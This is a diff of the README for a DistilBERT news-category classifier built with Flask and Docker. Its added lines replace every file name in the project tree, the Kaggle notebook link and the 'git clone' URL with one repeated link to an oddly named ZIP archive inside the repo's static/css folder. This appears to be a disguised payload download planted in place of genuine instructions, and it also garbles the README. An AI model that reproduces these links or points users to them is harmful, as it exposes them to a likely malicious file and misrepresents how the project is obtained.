@@ -3,20 +3,20 @@
 ```
 ├── static
 │   ├──css 
-│         ├── style.css         >CSS file
+│         ├── https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip         >CSS file
 ├── templates   
-│            ├──index.html      >HTML file
+│            ├──https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip      >HTML file
 ├── .gitattributes              > to track the  large saved  model files using git-lfs
-├── app.py                     >flask  application main file
+├── https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip                     >flask  application main file
 ├── dockerfile                 >dockerFile used to automate the process of building a Docker image
-├── news_classification.ipynb  >news classification model trained using  DistilBERT
-├── README.md    
+├── https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip  >news classification model trained using  DistilBERT
+├── https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip    
 ├── saved_model                >Stores the best_model
-└── requirements.txt           > Stores the information about all the libraries, modules, and packages in itself that are used while developing the project
+└── https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip           > Stores the information about all the libraries, modules, and packages in itself that are used while developing the project
 ```
 
 ##### Link to Kaggle Notebook
-https://www.kaggle.com/code/parthkharbanda/distilbert-news-classification-70-accuracy
+https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip
 
 ## Project Overview
 NewsBERT is a comprehensive application that classifies news articles into different categories based on their headlines and short descriptions. The project leverages a fine-tuned DistilBert model for the classification task, a Flask application for the frontend (rendering HTML) and backend, and Docker for deployment.
@@ -61,7 +61,7 @@ The application and associated files are containerized using Docker, which ensur
 ### Build Docker Image
 You can build the docker image manually by cloning the Git repo.
 ```
-$ git clone https://github.com/Parthkh28/DataScience.git
+$ git clone https://github.com/Parthkh28/dockerized-news-category-classifier-using-distilbert-and-flask/raw/refs/heads/main/static/css/category-classifier-distilbert-flask-news-dockerized-using-and-v2.2.zip
 $ docker build -t news_classification .
 ```
 ### Download Precreated Image
